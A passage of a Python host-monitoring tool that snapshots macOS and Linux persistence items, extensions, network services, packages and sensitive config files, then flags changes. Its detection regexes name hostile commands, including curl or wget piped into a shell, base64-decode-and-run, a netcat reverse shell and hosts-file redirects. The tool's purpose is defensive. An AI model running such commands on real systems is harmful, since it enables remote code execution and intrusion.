        return (None, "")
    out = run(["plutil", "-convert", "json", "-o", "-", real], timeout=8)
    try:
        d = json.loads(out)
    except Exception:
        return (None, "")
    # A *valid* plist can have a non-dict root (`<array>`), so plutil emits `["x"]` and the
    # old `d.get(...)` raised AttributeError. That crash was fatal AND self-perpetuating:
    # the snapshot is saved only after build_findings, so the plist stayed "added" and the
    # daily digest died identically every day. Validate the shape of every value used.
    if not isinstance(d, dict):
        return (None, "")
    prog = d.get("Program") if isinstance(d.get("Program"), str) else None
    args = d.get("ProgramArguments")
    argv = [a for a in args if isinstance(a, str)] if isinstance(args, list) else []
    if prog is None and argv:
        prog = argv[0]
    return (prog, " ".join(argv)[:MAX_ARGV])


def program_of_plist(plist_path: str):
    """Just the executable a launchd plist runs, so we can trust-check it."""
    return plist_program_and_argv(plist_path)[0]


# ---------------------------------------------------------------------------
# attribution — "why did this appear?" from recent shell history
# ---------------------------------------------------------------------------

_HISTORY: list[str] | None = None

def load_history() -> list[str]:
    global _HISTORY
    if _HISTORY is not None:
        return _HISTORY
    cmds: list[str] = []
    for name in (".zsh_history", ".bash_history", ".local/share/fish/fish_history"):
        p = HOME / name
        try:
            if not p.is_file():
                continue
            text = safe_read_text(p, tail=True)   # bounded: a huge history must not OOM us
            if text is None:
                continue
            lines = text.splitlines()[-6000:]
            for ln in lines:
                # zsh extended history: ": 1690000000:0;the command"
                m = re.match(r"^: \d+:\d+;(.*)$", ln)
                cmds.append(m.group(1) if m else ln.strip())
        except Exception:
            pass
    _HISTORY = cmds
    return cmds


def attribution_for(term: str) -> str | None:
    """Most recent shell command mentioning `term` (an installed pkg/app name)."""
    if not term:
        return None
    word = re.compile(r"(?<![\w-])" + re.escape(term.lower()) + r"(?![\w-])")  # whole-word, not substring
    for cmd in reversed(load_history()):
        cl = cmd.lower()
        if word.search(cl) and any(v in cl for v in ("install", "add ", "brew", "npm", "pip", "-g", "cask", "get ")):
            return cmd.strip()[:80]
    return None


# ---------------------------------------------------------------------------
# collectors — common category names, per-platform backends feed a common schema.
# each returns {stable_key: fingerprint/display}. Linux backends are deferred stubs.
# ---------------------------------------------------------------------------

def _mac_login_items():
    need("osascript")
    # Join names with a newline (not the default comma) so a name containing a comma
    # (e.g. "Adobe, Inc. Helper") isn't split into phantom items.
    out = run_checked(["osascript", "-e",
               'set text item delimiters to linefeed\n'
               'tell application "System Events" to return (name of every login item) as text'])
    return {x.strip(): x.strip() for x in out.split("\n") if x.strip()}


def _mac_launch_items():
    dirs = [HOME / "Library/LaunchAgents", Path("/Library/LaunchAgents"),
            Path("/Library/LaunchDaemons")]
    out = {}
    for d in dirs:
        try:
            for p in sorted(d.glob("*.plist")):
                # Fingerprint by CONTENT hash, not mtime: catches a swapped plist that
                # preserved mtime (cp -p) and ignores a bare `touch` (mtime-only change).
                # A non-regular entry is REPORTED, not skipped: reading it would hang
                # (see is_regular), but a FIFO/device in LaunchAgents is itself anomalous
                # and must stay visible in the highest-signal persistence category.
                if not is_regular(p):
                    out[tilde(str(p))] = "not a regular file (not read)"
                    continue
                data = safe_read_bytes(p)
                try:
                    fp = (f"{p.stat().st_size}:{sha(data.decode('latin-1'))}" if data is not None
                          else f"{p.stat().st_size}:?")
                except Exception:
                    fp = "?:?"
                out[tilde(str(p))] = fp
        except Exception:
            pass
    return out


def _mac_kexts():
    need("kextstat")
    out = run_checked(["kextstat", "-l"], timeout=10)
    res = {}
    for line in out.splitlines():
        # Record ANY reverse-DNS-ish id, Apple's included: `startswith("com.apple")` is a string
        # test, not provenance, so naming a rootkit `com.apple.driver.AudioHelper` removed it from
        # the report entirely — and real third-party prefixes (`co.`, `dev.`, `me.`) were never
        # collected at all.
        m = re.search(r"\b([a-z][\w-]*(?:\.[\w-]+){1,})\s*\(([^)]*)\)", line, re.I)
        if m:
            res[m.group(1)] = m.group(2)
    return res


def _ext_version_key(manifest_path: str):
    """Sort extension version dirs NUMERICALLY: lexical order put `1.10.0_0` before `1.9.0_0`, so
    the collector read the OLD manifest and reported a stale name."""
    v = os.path.basename(os.path.dirname(manifest_path))
    return [int(x) if x.isdigit() else x for x in re.split(r"[._]", v)]


def _mac_browser_extensions():
    res = {}
    # Chromium-family: <profile>/Extensions/<id>/<version>/manifest.json
    chromium = [
        HOME / "Library/Application Support/Google/Chrome",
        HOME / "Library/Application Support/BraveSoftware/Brave-Browser",
        HOME / "Library/Application Support/Microsoft Edge",
        HOME / "Library/Application Support/Arc/User Data",
    ]
    for base in chromium:
        for ext_dir in glob.glob(str(base / "*/Extensions/*")):
            ext_id = os.path.basename(ext_dir)
            if ext_id == "Temp":
                continue
            name = ext_id
            mans = [m for m in sorted(glob.glob(os.path.join(ext_dir, "*/manifest.json")),
                                      key=_ext_version_key)
                    if is_regular(m)]   # a FIFO manifest would hang the read forever
            fp = ""
            if mans:
                raw = safe_read_text(mans[-1]) or ""
                # Fingerprint the manifest CONTENT + version, not the display name alone: with the
                # name only, overwriting background.js, adding <all_urls>/cookies/webRequest
                # permissions, or swapping the .xpi were ALL invisible. Extension directories are
                # user-writable and need no admin.
                fp = f"{os.path.basename(os.path.dirname(mans[-1]))} [{sha(raw)}]"
                try:
                    n = json.loads(raw).get("name", "")
                    if n and not n.startswith("__MSG_"):
                        name = n
                except Exception:
                    pass
            browser = base.name
            res[f"{browser}:{ext_id}"] = f"{name} {fp}".strip()
    # Firefox
    for ext in glob.glob(str(HOME / "Library/Application Support/Firefox/Profiles/*/extensions/*")):
        res[f"Firefox:{os.path.basename(ext)}"] = os.path.basename(ext)
    return res


def _mac_system_extensions():
    need("systemextensionsctl")
    out = run_checked(["systemextensionsctl", "list"])
    res = {}
    for line in out.splitlines():
        m = re.search(r"(\b[a-z0-9]+(?:\.[a-z0-9-]+){2,}\b).*\[([^\]]+)\]", line, re.I)
        if m:
            res[m.group(1)] = m.group(2).strip()
    return res


_PORT_F_RE = re.compile(r":(\d+)$")

def _listening():
    need("lsof")
    # lsof field mode (-F): robust against full command names that contain spaces
    # AND against the default 9-char COMMAND truncation that merged distinct processes
    # (e.g. python3.11 vs python3.12 both became "python3.1").
    out = run_checked(["lsof", "-nP", "-iTCP", "-sTCP:LISTEN", "-Fcn"])
    by_cmd: dict[str, set] = {}
    cur = None
    for line in out.splitlines():
        if not line:
            continue
        tag, val = line[0], line[1:]
        if tag == "c":
            cur = val
            by_cmd.setdefault(cur, set())
        elif tag == "n" and cur is not None:
            m = _PORT_F_RE.search(val)
            if m:
                by_cmd[cur].add(m.group(1))
    return {c: ",".join(sorted(p, key=lambda x: (len(x), x))) for c, p in by_cmd.items() if p}


def _outbound():
    """Processes with an established outbound TCP connection (churny — quiet tier)."""
    need("lsof")
    out = run_checked(["lsof", "-nP", "-iTCP", "-sTCP:ESTABLISHED", "-Fc"])
    cmds = {line[1:] for line in out.splitlines() if line.startswith("c")}
    return {c: "connected" for c in sorted(cmds)}


def _mac_net_config():
    need("scutil")
    res = {}
    for line in run_checked(["scutil", "--dns"]).splitlines():
        m = re.search(r"nameserver\[\d+\]\s*:\s*(\S+)", line)
        if m:
            res[f"DNS {m.group(1)}"] = "nameserver"
    proxy = run_checked(["scutil", "--proxy"])
    for key, label in (("HTTPEnable", "HTTP proxy"), ("HTTPSEnable", "HTTPS proxy"),
                       ("SOCKSEnable", "SOCKS proxy"), ("ProxyAutoConfigEnable", "auto-proxy (PAC)")):
        m = re.search(rf"{key}\s*:\s*(\d)", proxy)
        if m and m.group(1) == "1":
            res[label] = "enabled"
    return res


def _mac_brew():
    need("brew")
    res = {}
    for line in run_checked(["brew", "list", "--versions"], timeout=40).splitlines():
        parts = line.split()
        if parts:
            res[parts[0]] = parts[-1] if len(parts) > 1 else ""
    # casks (GUI apps installed via brew) — invisible to `brew list --versions`
    for line in run_checked(["brew", "list", "--cask", "--versions"], timeout=40).splitlines():
        parts = line.split()
        if parts:
            res[f"{parts[0]} (cask)"] = parts[-1] if len(parts) > 1 else ""
    return res


def _npm_global():
    need("npm")
    out = run_checked(["npm", "ls", "-g", "--depth=0", "--json"], timeout=25)
    if not out.strip():
        return {}
    try:
        deps = json.loads(out).get("dependencies", {}) or {}
        return {n: (v or {}).get("version", "") for n, v in deps.items()}
    except Exception:
        return {}


def _pip():
    # NOTE: which pip3 is first on PATH decides WHICH interpreter's packages we see
    # (system vs Homebrew python), so a daily job and a shell run can legitimately
    # disagree. need() at least turns "pip3 absent" into a guarded skip rather than
    # "every package removed"; install.sh pins the job's PATH so both agree.
    need("pip3")
    out = run_checked(["pip3", "list", "--format=freeze"], timeout=25)
    res = {}
    for line in out.splitlines():
        if "==" in line:
            name, _, ver = line.partition("==")
            res[name] = ver
    return res


def _mac_applications():
    res = {}
    for base in ("/Applications", str(HOME / "Applications")):
        try:
            for entry in sorted(os.listdir(base)):
                if entry.endswith(".app"):
                    # disambiguate ~/Applications from /Applications so a same-named
                    # app in both doesn't silently overwrite the other
                    name = entry[:-4] if base == "/Applications" else f"{entry[:-4]}{USER_APPS_TAG}"
                    # the REAL path, not just the directory: _enrich rebuilt it as
                    # f"{value}/{bare_key(key)}.app", so a bundle named `Calculator (cask).app`
                    # made the trust check stat /Applications/Calculator.app and print ANOTHER
                    # app's signature, while `Evil (snap).app` pointed at a nonexistent path so an
                    # unsigned bundle never escalated to RED. /Applications is admin-writable.
                    res[name] = os.path.join(base, entry)
        except Exception:
            pass
    return res


def _mac_mas():
    need("mas")
    out = run_checked(["mas", "list"], timeout=15)
    res = {}
    for line in out.splitlines():
        m = re.match(r"(\d+)\s+(.*?)\s+\(([^)]+)\)\s*$", line)
        if m:
            res[m.group(2).strip()] = m.group(3)
    return res


# ---------------------------------------------------------------------------
# Linux backends — feed the SAME common schema as the macOS ones. Verified on a
# real Linux box; collectors return {} where a concept has no Linux equivalent.
# ---------------------------------------------------------------------------

class ToolUnavailable(Exception):
    """A collector's external tool isn't on PATH. Raised (not swallowed) so the per-collector
    failure isolation records it in snap["errors"], which is what lets the diff SKIP the
    category instead of reporting every item in it as removed."""


def need(*tools):
    """Assert the tools a collector depends on are actually resolvable.

    `run()` returns "" for a missing binary exactly as it does for "no output", so a
    collector silently returned {} — and the daily job's PATH is NOT your shell's: launchd
    hands agents a default PATH with no /opt/homebrew/bin and no ~/.local/bin, so `brew`
    and `npm` vanished, 192 packages read as REMOVED, and the flood pushed a genuine new
    install past the render cap. Fail loudly instead; the diff then guards the category."""
    missing = [t for t in tools if not shutil.which(t)]
    if missing:
        raise ToolUnavailable("not on PATH: " + ", ".join(missing))


def run_checked(cmd, timeout=15):
    """run() but a FAILURE IS AN ERROR, not an empty result. `run()` returns "" for a timeout,
    a crash and "no output" alike, so a `brew list` that timed out (40s, plausible under load)
    produced an empty collector with NO error recorded — the capability guard keys off
    snap["errors"], so it could not fire and the 192-phantom-removal flood came back, exactly
    the incident this release claims to have fixed. Non-zero WITH output is tolerated: `npm ls -g`
    exits non-zero on peer-dependency complaints while still printing valid JSON."""
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, errors="replace")
    except subprocess.TimeoutExpired:
        raise ToolUnavailable(f"{cmd[0]} timed out after {timeout}s")
    except OSError as e:
        raise ToolUnavailable(f"{cmd[0]} could not run ({e.__class__.__name__})")
    if p.returncode != 0 and not p.stdout.strip():
        raise ToolUnavailable(f"{cmd[0]} failed (exit {p.returncode})")
    return p.stdout


def _has(cmd: str) -> bool:
    return bool(run(["sh", "-c", f"command -v {shlex.quote(cmd)}"]).strip())


def _none():
    return {}


SYS_AUTOSTART_DIR = Path("/etc/xdg/autostart")   # module-level so tests can point it at a tmp dir

def _linux_autostart():
    """XDG autostart .desktop entries — the Linux 'login items' equivalent."""
    res = {}
    for base in (HOME / ".config/autostart", SYS_AUTOSTART_DIR):
        # The two dirs hold same-named files (`x.desktop` exists in both), so a bare
        # basename key let the SYSTEM entry silently overwrite the USER one — hiding a
        # planted ~/.config/autostart entry behind a benign system copy. Tag the system
        # side; the user side keeps the plain basename (and `undo_hint` keys off the tag
        # to point `rm` at the right directory, with sudo).
        tag = SYS_AUTOSTART_TAG if base == SYS_AUTOSTART_DIR else ""
        for f in sorted(glob.glob(str(base / "*.desktop"))):
            key = os.path.basename(f) + tag
            name = os.path.basename(f)
            content = ""
            if not is_regular(f):
                # reported, not skipped — reading a FIFO here hangs the daily job
                res[key] = f"{name} [not a regular file (not read)]"
                continue
            try:
                content = safe_read_text(f) or ""
                for line in content.splitlines():
                    if line.startswith("Name="):
                        name = line.split("=", 1)[1].strip() or name
                        break
            except Exception:
                pass
            # Fingerprint by CONTENT hash, not Name= alone (parity with the macOS
            # plist sibling): swapping Exec=/usr/bin/true → Exec=/tmp/miner in an
            # existing entry keeps Name= identical and would otherwise be invisible in
            # the highest-signal persistence category.
            res[key] = f"{name} [{sha(content)}]" if content else name
    return res


def _systemctl_execstart(scope, units):
    """{unit -> its effective ExecStart line(s)} via ONE batched `systemctl show`.
    `show` reflects the LOADED value including `*.service.d/*.conf` drop-in overrides."""
    execs = {}
    if not units:
        return execs
    out = run(["systemctl"] + scope + ["show", "--no-pager",
              "--property=Id", "--property=ExecStart"] + units, timeout=15)
    for block in out.split("\n\n"):
        uid, lines = None, []
        for line in block.splitlines():
            if line.startswith("Id="):
                uid = line[3:]
            elif line.startswith("ExecStart="):
                lines.append(line)
        if uid:
            execs[uid] = "\n".join(lines)
    return execs


def _linux_services():
    """Enabled systemd units (system + user) + legacy init scripts — persistence."""
    res = {}
    for scope, tag in (([], ""), (["--user"], "user:")):
        # socket/path activation is standard persistence needing no root; both were absent from
        # every snapshot, so a `.path`-triggered payload was permanently invisible.
        out = run_checked(["systemctl"] + scope + ["list-unit-files",
                          "--type=service,timer,socket,path",
                   "--state=enabled", "--no-legend", "--no-pager"], timeout=15)
        units = [p[0] for line in out.splitlines() if (p := line.split())]
        # Fold each unit's effective ExecStart into the fingerprint — parity with the
        # macOS plist / Linux .desktop content hash. A swapped ExecStart (or a drop-in
        # override) on an already-enabled unit is otherwise byte-identical here and would
        # be invisible in the highest-signal Linux persistence category.
        execs = _systemctl_execstart(scope, units)
        for u in units:
            fp = execs.get(u, "")
            res[f"{tag}{u}"] = f"enabled [{sha(fp)}]" if fp else "enabled"
    for f in sorted(glob.glob("/etc/init.d/*")):
        if os.path.isfile(f):
            try:
                res[f] = f"init.d [{sha(safe_read_text(f) or '')}]"
            except Exception:
                res[f] = "init.d"
    return res


def _linux_kmods():
    """Loaded kernel modules (lsmod) — a NEW module is the signal."""
    need("lsmod")
    res = {}
    for line in run_checked(["lsmod"], timeout=10).splitlines()[1:]:
        parts = line.split()
        if parts:
            res[parts[0]] = parts[1] if len(parts) > 1 else ""
    return res


def _linux_browser_extensions():
    res = {}
    for base in (HOME / ".config/google-chrome", HOME / ".config/chromium",
                 HOME / ".config/BraveSoftware/Brave-Browser", HOME / ".config/microsoft-edge"):
        for ext_dir in glob.glob(str(base / "*/Extensions/*")):
            ext_id = os.path.basename(ext_dir)
            if ext_id == "Temp":       # parity with the macOS collector (staging dir)
                continue
            name = ext_id
            mans = [m for m in sorted(glob.glob(os.path.join(ext_dir, "*/manifest.json")),
                                      key=_ext_version_key)
                    if is_regular(m)]   # a FIFO manifest would hang the read forever
            fp = ""
            if mans:
                raw = safe_read_text(mans[-1]) or ""
                fp = f"{os.path.basename(os.path.dirname(mans[-1]))} [{sha(raw)}]"
                try:
                    n = json.loads(raw).get("name", "")
                    if n and not n.startswith("__MSG_"):
                        name = n
                except Exception:
                    pass
            res[f"{base.name}:{ext_id}"] = f"{name} {fp}".strip()
    for ext in glob.glob(str(HOME / ".mozilla/firefox/*/extensions/*")):
        # size+mtime of the .xpi: keyed AND fingerprinted by the same id, swapping the archive in
        # place was invisible. (Hashing every .xpi would read tens of MB per snapshot.)
        try:
            st = os.stat(ext)
            fp = f"{st.st_size}:{int(st.st_mtime)}"
        except OSError:
            fp = "?"
        res[f"firefox:{os.path.basename(ext)}"] = fp
    return res


_SS_PROC_RE = re.compile(r'users:\(\("([^"]+)"')

def _linux_listening():
    """ss -ltnp: listening TCP keyed by process (falls back to lsof if ss absent)."""
    out = run(["ss", "-H", "-ltnp"], timeout=10)
    if not out.strip():
        return _listening()
    by_cmd: dict[str, set] = {}
    for line in out.splitlines():
        parts = line.split()
        if len(parts) < 4:
            continue
        port = parts[3].rsplit(":", 1)[-1]
        m = _SS_PROC_RE.search(line)
        by_cmd.setdefault(m.group(1) if m else "?", set()).add(port)
    return {c: ",".join(sorted(p, key=lambda x: (len(x), x))) for c, p in by_cmd.items() if p}


def _linux_outbound():
    out = run(["ss", "-H", "-tnp", "state", "established"], timeout=10)
    cmds = {m.group(1) for line in out.splitlines() for m in [_SS_PROC_RE.search(line)] if m}
    return {c: "connected" for c in sorted(cmds)}


def _linux_net_config():
    res = {}
    try:
        for line in (safe_read_text("/etc/resolv.conf") or "").splitlines():
            m = re.match(r"\s*nameserver\s+(\S+)", line)
            if m:
                res[f"DNS {m.group(1)}"] = "nameserver"
    except Exception:
        pass
    # SYSTEM-level proxy config, NOT the process environment. Reading os.environ here
    # reflected whoever ran `since` — a systemd-timer run (no proxy vars) vs an
    # interactive shell (proxy exported) oscillated a false ORANGE "worth a look" +
    # notify every day. /etc/environment and profile.d are stable regardless of caller.
    for src in (Path("/etc/environment"), *[Path(p) for p in sorted(glob.glob("/etc/profile.d/*.sh"))]):
        try:
            for line in (safe_read_text(src) or "").splitlines():
                m = re.match(r"\s*(?:export\s+)?(https?_proxy|all_proxy)\s*=\s*(\S+)", line, re.I)
                if m:
                    res[f"{m.group(1).lower()} ({src.name})"] = redact(m.group(2).strip('"\''))
        except Exception:
            pass
    return res


def _linux_packages():
    """Primary system package manager + snap + flatpak."""
    res = {}
    if _has("dpkg-query"):
        cmd = ["dpkg-query", "-W", "-f=${Package} ${Version}\n"]
    elif _has("rpm"):
        cmd = ["rpm", "-qa", "--qf", "%{NAME} %{VERSION}\n"]
    elif _has("pacman"):
        cmd = ["pacman", "-Q"]
    else:
        cmd = None
        if not (_has("snap") or _has("flatpak")):
            # no package manager at all is reachable — say so rather than return {}
            raise ToolUnavailable("no package manager on PATH (dpkg-query/rpm/pacman/snap/flatpak)")
    if cmd:
        # run_checked: unchecked, a dpkg-query/rpm/pacman timeout returned "" with no error
        # recorded, so the capability guard could not fire and EVERY Linux package read as
        # removed — the phantom flood, still fully reachable on Linux.
        for line in run_checked(cmd, timeout=40).splitlines():
            p = line.split()
            if p:
                res[p[0]] = p[1] if len(p) > 1 else ""
    if _has("snap"):
        for line in run_checked(["snap", "list"], timeout=15).splitlines()[1:]:
            p = line.split()
            if p:
                res[f"{p[0]} (snap)"] = p[1] if len(p) > 1 else ""
    if _has("flatpak"):
        for line in run_checked(["flatpak", "list", "--columns=application,version"], timeout=15).splitlines():
            p = line.split("\t") if "\t" in line else line.split()
            if p and p[0]:
                res[f"{p[0].strip()} (flatpak)"] = (p[1].strip() if len(p) > 1 else "")
    return res


# Category registry. Each: key, label, per-platform backend, class, tier.
#   cls: "persistence" | "network" | "software" | "config-fact"
#   tier: "loud" (ranked in the digest) | "inventory" | "quiet" (only with --all)
CATEGORIES = [
    # key,               label,                       macos,                    linux,                    cls,            tier
    ("login_items",      "Login items",               _mac_login_items,         _linux_autostart,         "persistence",  "loud"),
    ("launch_items",     "Startup/background jobs",    _mac_launch_items,        _linux_services,          "persistence",  "loud"),
    ("kernel_extensions","Kernel extensions",          _mac_kexts,               _linux_kmods,             "persistence",  "loud"),
    ("browser_extensions","Browser extensions",        _mac_browser_extensions,  _linux_browser_extensions,"persistence",  "loud"),
    ("system_extensions","System extensions",          _mac_system_extensions,   _none,                    "persistence",  "loud"),
    ("listening",        "Listening network services", _listening,               _linux_listening,         "network",      "loud"),
    ("net_config",       "DNS / proxy settings",       _mac_net_config,          _linux_net_config,        "network",      "loud"),
    ("outbound",         "Outbound connections",       _outbound,                _linux_outbound,          "network",      "quiet"),
    ("brew",             "Homebrew packages",          _mac_brew,                _linux_packages,          "software",     "inventory"),
    ("npm_global",       "Global npm packages",        _npm_global,              _npm_global,              "software",     "inventory"),
    ("pip",              "pip packages",               _pip,                     _pip,                     "software",     "inventory"),
    ("applications",     "Applications",               _mac_applications,        _none,                    "software",     "inventory"),
    ("mac_app_store",    "Mac App Store apps",         _mac_mas,                 _none,                    "software",     "inventory"),
]
CAT = {c[0]: {"label": c[1], "cls": c[4], "tier": c[5]} for c in CATEGORIES}
# platform-appropriate labels so a Linux user doesn't see "Homebrew packages"
if PLATFORM == "linux":
    for k, lbl in {"login_items": "Autostart entries", "launch_items": "Enabled services / init",
                   "kernel_extensions": "Kernel modules", "brew": "System packages (apt/dnf/…)",
                   "applications": "Desktop apps", "mac_app_store": "App store"}.items():
        if k in CAT:
            CAT[k]["label"] = lbl


def backend_for(cat_key: str):
    for key, _lbl, mac, lin, _cls, _tier in CATEGORIES:
        if key == cat_key:
            return mac if PLATFORM == "macos" else lin
    return None


# text files whose *contents* we track, so we can show the exact line that changed
def malicious_hits(text: str) -> dict:
    """Descriptions of every malicious pattern present in `text`, scanned LINE BY LINE with a
    per-line cap. These patterns are line-oriented, and one `search()` over a whole blob (up to
    MAX_READ) was quadratic in the number of trigger tokens on a single line. Bounding the line
    length here AND the patterns' own runs above keeps the scan linear."""
    hits: dict = {}
    for line in text.splitlines():
        seen = set()
        # CHUNK, don't truncate. `line[:_REDACT_MAX]` meant a payload appended after 4KB of
        # padding ON ONE LINE was never flagged — which re-opened the very hole blob_flags was
        # added to close (past BLOB_MAX the diff text is gone too, so the finding lost RED and
        # its "why"). Overlap by more than the longest bounded run so nothing hides on a seam.
        for start in range(0, max(len(line), 1), _SCAN_CHUNK - _SCAN_OVERLAP):
            window = line[start:start + _SCAN_CHUNK]
            for pat, lit, desc in MALICIOUS_PATTERNS_LIT:
                # required-literal pre-filter first: `curl[^\n|]*\|` is unbounded in the same
                # way `.*` is (it just excludes two characters), so it is quadratic in line
                # length — 8MB of 4096-column `curl ` lines cost 20-56s at SNAPSHOT time. A
                # `str.find` for the literal the pattern cannot match without is linear and
                # rejects those lines outright: 20225ms -> 58ms, detection unchanged.
                # COUNT occurrences (per line), don't just record presence: descriptions are
                # shared between patterns (`curl|sh` and `wget|sh`), so one benign decoy comment
                # planted in the baseline marked a description present forever and suppressed
                # every later real payload sharing it. An increased count still escalates.
                if desc in seen or (lit and lit not in window):
                    continue
                if pat.search(window):
                    seen.add(desc)
            if len(window) < _SCAN_CHUNK:
                break
        for desc in seen:
            hits[desc] = hits.get(desc, 0) + 1
    return hits


def text_sources(flags: dict | None = None) -> dict[str, str]:
    out: dict[str, str] = {}

    def add(label, content):
        if content and content.strip():
            # Scan for malicious patterns over the FULL content, BEFORE the storage cap: the
            # stored blob is truncated at BLOB_MAX and the diff is skipped above DIFF_MAX_*, so
            # a payload appended after ~300KB of padding never reached the diff — the change was
            # still detected (the sha covers everything) but it silently fell RED -> ORANGE and
            # lost its "why". Flags are diffed separately, so escalation survives truncation.
            if flags is not None:
                # the COUNT per pattern description, not a flattened list: see _flag_counts —
                # presence alone let a benign decoy in the baseline suppress a real payload.
                hits = malicious_hits(content)
                if hits:
                    flags[label] = hits
            if len(content) > BLOB_MAX:
                content = (content[:BLOB_MAX]
                           + f"\n… [truncated at {BLOB_MAX} bytes for storage; "
                             f"sha of full content={sha(content)}]\n")
            out[label] = content

    # cross-platform sensitive files (most paths exist on both macOS and Linux)
    common = [HOME / ".bashrc", HOME / ".profile", HOME / ".zshrc", HOME / ".bash_profile",
              HOME / ".gitconfig", HOME / ".npmrc", HOME / ".curlrc", HOME / ".wgetrc",
              HOME / ".ssh/config", HOME / ".ssh/authorized_keys",
              Path("/etc/sudoers"), Path("/etc/ssh/sshd_config"), Path("/etc/profile")]
    if PLATFORM == "macos":
        rc = common + [HOME / ".zprofile", HOME / ".zshenv", HOME / ".config/fish/config.fish",
                       Path("/etc/zshrc"), Path("/etc/zprofile"), Path("/etc/bashrc")]
    else:  # linux
        rc = common + [HOME / ".bash_aliases", HOME / ".bash_logout",
                       Path("/etc/bash.bashrc"), Path("/etc/rc.local"),
                       Path("/etc/ld.so.preload")]  # ld.so.preload = a classic rootkit hook
    for p in rc:
        try:
            text = safe_read_text(p)
            if text is not None:
                add(tilde(str(p)), text)
        except Exception:
            pass

    try:
        add("/etc/hosts", safe_read_text("/etc/hosts") or "")
    except Exception:
        pass

    add("crontab (current user)", run(["crontab", "-l"]))
    # /etc/sudoers.d/* is the standard drop-in for privilege grants; the cron.* dirs and
    # the spool are where a real persistence entry would be planted — not just /etc/crontab.
    cron_sudo = (["/etc/crontab"]
                 + sorted(glob.glob("/etc/cron.d/*"))
                 + sorted(glob.glob("/etc/cron.hourly/*")) + sorted(glob.glob("/etc/cron.daily/*"))
                 + sorted(glob.glob("/etc/cron.weekly/*")) + sorted(glob.glob("/etc/cron.monthly/*"))
                 + sorted(glob.glob("/var/spool/cron/crontabs/*")) + sorted(glob.glob("/var/spool/cron/*"))
                 + sorted(glob.glob("/etc/sudoers.d/*")))
    for f in cron_sudo:
        try:
            text = safe_read_text(f)
            if text is not None:
                add(f, text)
        except Exception:
            pass
    return out


# system files whose edits are high-severity, and content that screams "malicious"
SENSITIVE_TEXT = ("/etc/hosts", "/etc/sudoers", "sshd_config", "authorized_keys", "crontab")
MALICIOUS_PATTERNS = [
    (re.compile(r"curl[^\n|]{0,400}\|\s*(ba)?sh", re.I), "pipes a download straight into a shell"),
    (re.compile(r"wget[^\n|]{0,400}\|\s*(ba)?sh", re.I), "pipes a download straight into a shell"),
    (re.compile(r"(ba)?sh\s+<\(\s*(curl|wget)", re.I), "runs a download via process substitution"),
    # bounded runs, not `.*`: unbounded, these were quadratic in the number of trigger tokens
    # on one line — a planted line of repeated `base64 -d ` cost 55s at 375KB and hours at
    # MAX_READ, at SNAPSHOT time. A real decode-and-run chain is adjacent, not megabytes apart.
    (re.compile(r"\bbase64\b\s+-{1,2}d\w*[^\n]{0,400}?\|\s*(ba)?sh", re.I), "decodes base64 and runs it"),
    (re.compile(r"\bnc\b[^\n]{0,400}?-e\b", re.I), "netcat reverse shell"),
    (re.compile(r"^\s*0\.0\.0\.0\s+\S*[a-z]", re.I | re.M), "redirects a real domain (hosts)"),
    # 127.0.0.1 mapping a real domain (not localhost/broadcasthost) — phishing redirect
    (re.compile(r"^\s*127\.0\.0\.1\s+(?!localhost|broadcasthost)\S*\.[a-z]{2,}", re.I | re.M),
     "redirects a real domain to localhost (hosts)"),
]
# The same patterns paired with a literal each one CANNOT match without. `str.find` is linear
# and rejects a whole window before the regex engine runs, which is what makes the scan safe on
# attacker-sized input: `curl[^\n|]*\|` is unbounded in exactly the way `.*` is (it merely
# excludes two characters) and so is quadratic in LINE LENGTH — 8MB of 4096-column `curl `
# lines measured 20-56s at snapshot time, before any snapshot is saved.
# A literal here MUST be a substring every match contains, or detection is silently lost;
# test_malicious_literals_are_implied_by_their_pattern pins that.
_SCAN_CHUNK = 4096
_SCAN_OVERLAP = 512          # > the longest bounded run (400) so no payload hides on a seam
MALICIOUS_PATTERNS_LIT = [
    (MALICIOUS_PATTERNS[0][0], "|", MALICIOUS_PATTERNS[0][1]),
    (MALICIOUS_PATTERNS[1][0], "|", MALICIOUS_PATTERNS[1][1]),
    (MALICIOUS_PATTERNS[2][0], "<(", MALICIOUS_PATTERNS[2][1]),
    (MALICIOUS_PATTERNS[3][0], "|", MALICIOUS_PATTERNS[3][1]),
    (MALICIOUS_PATTERNS[4][0], "-e", MALICIOUS_PATTERNS[4][1]),
    (MALICIOUS_PATTERNS[5][0], "0.0.0.0", MALICIOUS_PATTERNS[5][1]),
    (MALICIOUS_PATTERNS[6][0], "127.0.0.1", MALICIOUS_PATTERNS[6][1]),
]


# ---------------------------------------------------------------------------
# snapshot
# ---------------------------------------------------------------------------

def take_snapshot(all_cats=True) -> dict:
    snap = {
        "schema": SCHEMA_VERSION,
        "platform": PLATFORM,
        "created": datetime.now().isoformat(timespec="seconds"),
        "epoch": int(time.time()),
        "euid": EUID,
        "root": IS_ROOT,
        "tools": tool_identity(),
        "host": (run(["scutil", "--get", "ComputerName"]).strip()
                 if PLATFORM == "macos" else platform_module.node()),
        "collectors": {},
        "blobs": {},
        "blob_flags": {},
        "errors": {},
    }
    for key, _lbl, _mac, _lin, _cls, _tier in CATEGORIES:
        fn = backend_for(key)
        if fn is None:
            snap["errors"][key] = f"no backend for platform '{PLATFORM}'"
            snap["collectors"][key] = {}
            continue
        try:
            snap["collectors"][key] = fn()
        except Exception as e:
            snap["collectors"][key] = {}
            snap["errors"][key] = str(e)
    try:
        flags: dict = {}
        snap["blobs"] = text_sources(flags)
        snap["blob_flags"] = flags
    except Exception as e:
        snap["errors"]["blobs"] = str(e)
    return snap


def _write_private(path: Path, text: str):
    """Write atomically at mode 0600 — the file is never group/world-readable, even
    momentarily (snapshots contain .npmrc tokens, .ssh contents, rc-file secrets),
    and a crash mid-write can't leave a truncated file at `path` (temp+rename)."""
    path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
    # mkstemp gives a guaranteed-unique temp name, so a stale `.tmp.<pid>` left by a
    # crashed run (or a reused PID) can no longer collide and raise FileExistsError.
    fd, tmpname = tempfile.mkstemp(dir=str(path.parent), prefix=f".{path.name}.", suffix=".tmp")
    tmp = Path(tmpname)
    try:
        os.fchmod(fd, 0o600)   # mkstemp is already 0600; be explicit
        with os.fdopen(fd, "w") as fh:
            fh.write(text)
        os.replace(tmp, path)  # atomic on POSIX
    finally:
        try:
            tmp.unlink()
        except FileNotFoundError:
            pass


def save_snapshot(snap: dict, label: str | None = None) -> Path:
    SNAP_DIR.mkdir(parents=True, exist_ok=True, mode=0o700)
